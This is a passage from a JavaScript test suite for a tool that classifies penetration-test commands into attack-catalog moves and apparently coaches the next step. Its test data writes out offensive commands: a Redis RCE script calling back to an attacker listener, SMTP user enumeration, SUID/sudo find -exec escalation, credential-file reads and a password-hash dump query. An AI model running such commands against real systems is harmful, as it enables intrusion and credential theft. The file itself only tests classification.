    assert.strictEqual(extractor.detectTool('sudo perl smtp-user-enum.pl -M VRFY -U /tmp/users.txt -t 198.51.100.73'), 'smtp-user-enum');
    assert.strictEqual(extractor.FACT_BEARING.has('smtp-user-enum'), true);
  });

  test('PG3-B4-8: VPN interface packet sniffer during active target shell classifies as attacker callback housekeeping', () => {
    const activeTargetCtx = {
      inTargetShell: true,
      facts: new Set(['foothold.linux']),
      target: '198.51.100.74'
    };
    const vpnSnifferTurn = {
      kind: 'bare',
      isDollar: true,
      promptLine: '$ sudo tcpdump -i tun0 icmp',
      command: 'sudo tcpdump -i tun0 icmp'
    };
    assert.strictEqual(trajectories.isAttackerTurn(vpnSnifferTurn, activeTargetCtx), true);
    const hk = trajectories.isHousekeepingTurn(vpnSnifferTurn, activeTargetCtx);
    assert.strictEqual(hk.housekeeping, true);
    assert.strictEqual(hk.reason, 'attacker_callback_listener');

    const remoteEthSnifferTurn = {
      kind: 'unix',
      host: 'app-node-04',
      user: 'op_user',
      promptLine: 'op_user@app-node-04:~$ sudo tcpdump -i eth0',
      command: 'sudo tcpdump -i eth0'
    };
    assert.strictEqual(trajectories.isAttackerTurn(remoteEthSnifferTurn, activeTargetCtx), false);
  });

  test('PG3-B4-9: OS-aware config file read routing maps Linux .ini/.conf reads to linux-loot-hunt instead of Windows stored-credentials', () => {
    const linuxMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-05', user: 'op_user', kind: 'unix', command: 'cat /opt/service/worker.ini' },
      { facts: new Set(['foothold.linux']), inTargetShell: true, target: '198.51.100.75' }
    ).map(c => c.id);
    assert.strictEqual(linuxMoves[0], 'linux-loot-hunt');
    assert.ok(!linuxMoves.includes('stored-credentials'));
    assert.ok(!linuxMoves.includes('windows-loot-hunt'));

    const winMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'WIN-NODE-05', kind: 'powershell', command: 'Get-Content C:\\ProgramData\\App\\worker.ini' },
      { facts: new Set(['foothold.windows']), inTargetShell: true, target: '198.51.100.76' }
    ).map(c => c.id);
    assert.ok(winMoves[0] === 'windows-loot-hunt' || winMoves[0] === 'stored-credentials');
    assert.ok(winMoves.includes('stored-credentials'));
  });

  test('PG3-B4-10: Broadened find -exec action attribution routes custom SUID/sudo payloads while sparing passive file readers', () => {
    const linuxFacts = new Set(['foothold.linux', 'privesc.suid', 'privesc.sudo_rights']);
    const customExecMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-06', kind: 'unix', command: 'find . -exec \'./priv_wrapper\' \\;' },
      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
    ).map(c => c.id);
    assert.strictEqual(customExecMoves[0], 'suid-gtfobins');
    assert.ok(!customExecMoves.includes('flag-hunt-linux') && !customExecMoves.includes('flag-hunt-root-linux'));

    const sudoFindExecMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-06', kind: 'unix', command: 'sudo find /tmp -exec /usr/local/bin/helper_bin \\;' },
      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
    ).map(c => c.id);
    assert.strictEqual(sudoFindExecMoves[0], 'sudo-abuse');

    const passiveCatMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-06', kind: 'unix', command: 'find / -name proof.txt -exec cat {} \\;' },
      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.77' }
    ).map(c => c.id);
    assert.strictEqual(passiveCatMoves[0], 'flag-hunt-root-linux');
    assert.ok(!passiveCatMoves.includes('suid-gtfobins'));
  });

  test('PG3-B4-11: Command-less Nmap open-port tables and Redis/MySQL CLI turns map to their catalog moves', () => {
    const cmdlessNmapMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      {
        kind: 'unprompted',
        command: '',
        stdout: '22/tcp   open  ssh     OpenSSH 8.4p1\n80/tcp   open  http    nginx 1.18.0\n6379/tcp open  redis   Redis 6.0.16'
      },
      { facts: new Set(), target: '198.51.100.78' }
    ).map(c => c.id);
    assert.strictEqual(cmdlessNmapMoves[0], 'nmap-fast-open-ports');

    const redisInfoMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'redis-cli -h 198.51.100.78 info server' },
      { facts: new Set(['port:6379', 'redis.reachable']), target: '198.51.100.78' }
    ).map(c => c.id);
    assert.strictEqual(redisInfoMoves[0], 'redis-enum');

    const redisRceMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'python3 redis-rce.py -r 198.51.100.78 -p 6379 -L 10.10.14.5 -f module.so' },
      { facts: new Set(['port:6379', 'redis.reachable', 'redis.unauth']), target: '198.51.100.78' }
    ).map(c => c.id);
    assert.ok(
      redisRceMoves[0] === 'redis-rogue-server-rce' || redisRceMoves[0] === 'redis-rce',
      'Expected redis RCE move at #1, got ' + redisRceMoves[0]
    );

    const mysqlLoginMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-07', kind: 'unix', command: 'mysql -u db_user -p' },
      { facts: new Set(['foothold.linux', 'db.creds']), inTargetShell: true, target: '198.51.100.78' }
    ).map(c => c.id);
    assert.strictEqual(mysqlLoginMoves[0], 'mysql-login');

    const mysqlLootMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-07', kind: 'repl', command: 'mysql select login_name, pass_digest from members;' },
      { facts: new Set(['foothold.linux', 'db.session']), inTargetShell: true, target: '198.51.100.78' }
    ).map(c => c.id);
    assert.strictEqual(mysqlLootMoves[0], 'mysql-loot');
  });

  test('PG3-B4-12: Closed-loop reachability deduplicates computeCoach calls, reports settled_by_engine drift, and seeds pre-command promptLine', () => {
    const sess = newSession('198.51.100.79', '10.10.14.5');
    sess.ingestTurn({
      command: 'nmap -sC -sV 198.51.100.79',
      stdout: [
        'Nmap scan report for 198.51.100.79',
        'PORT     STATE SERVICE VERSION',
        '22/tcp   open  ssh     OpenSSH 8.4p1 Debian',
        '80/tcp   open  http    Apache httpd 2.4.52',
        '6379/tcp open  redis   Redis key-value store 6.0.16'
      ].join('\n'),
      target: '198.51.100.79'
    });
    const baseCoach = sess.computeCoach('198.51.100.79');
    const flow = baseCoach.onFlow || [];
    if (flow.length >= 2) {
      const targetMove = flow[flow.length - 1];
      let coachCalls = 0;
      let ingestCalls = 0;
      const origCompute = sess.computeCoach.bind(sess);
      const origIngest = sess.ingestTurn.bind(sess);
      sess.computeCoach = function (t) {
        coachCalls++;
        return origCompute(t);
      };
      sess.ingestTurn = function (o) {
        ingestCalls++;
        return origIngest(o);
      };
      trajectories.evaluateClosedLoopReachability(
        sess,
        [{ id: targetMove.id, move: targetMove, score: 25 }],
        { command: 'synthetic' },
        { targetIp: '198.51.100.79', historyTurns: [], executedMoveIds: new Set() }
      );
      sess.computeCoach = origCompute;
      sess.ingestTurn = origIngest;
      const maxAllowedCalls = ingestCalls + 2;
      assert.ok(coachCalls <= maxAllowedCalls, 'Expected deduplicated computeCoach calls <= ' + maxAllowedCalls + ', got ' + coachCalls);
    }

    const driftMove = {
      id: 'synthetic-settled-drift-move',
      produces: ['privesc.leads', 'host.kernel', 'host.arch'],
      commands: [{ run: 'uname -a' }],
      eligible: () => true,
      settled: () => true,
      obsolete: () => false
    };
    const driftRes = trajectories.evaluateClosedLoopReachability(
      sess,
      [{ id: driftMove.id, move: driftMove, score: 25 }],
      { command: 'uname -a' },
      { targetIp: '198.51.100.79', historyTurns: [], executedMoveIds: new Set() }
    );
    assert.strictEqual(driftRes.reachable, false);
    assert.strictEqual(driftRes.settled_by_engine, true);
    assert.strictEqual(driftRes.mode, 'settled_predicate_drift');
    assert.ok(/SETTLED_PREDICATE_DRIFT/.test(driftRes.detail));

    const rep = trajectories.replayWalkthrough(OBOL, {
      slug: 'synth-preprompt-linux-ini',
      markdown: [
        '```console',
        '[op_user@app-node-08 cfg]$ cat service_auth.ini',
        'db_user = svc_reader',
        'db_password = SynthIniPassword404!',
        '```'
      ].join('\n')
    }, {
      target: '198.51.100.80',
      lhost: '10.10.14.5'
    });
    assert.strictEqual(rep.steps.length, 1);
    assert.ok(
      Array.isArray(rep.steps[0].matched_moves) && rep.steps[0].matched_moves[0] === 'linux-loot-hunt',
      'Expected pre-command [op_user@app-node-08 cfg]$ prompt to route cat service_auth.ini to linux-loot-hunt'
    );
  });

  if (failures.length > 0) {
    console.error('\nPG-1 smoke suite FAILED: ' + failures.length + ' failed, ' + passed + ' passed.');
    process.exit(1);
  }
  console.log('\nPG-1 smoke suite PASSED: ' + passed + '/' + passed + ' assertions succeeded.');
}

if (require.main === module) {
  runSmokeSuite();
}

module.exports = {
  runSmokeSuite: runSmokeSuite
};
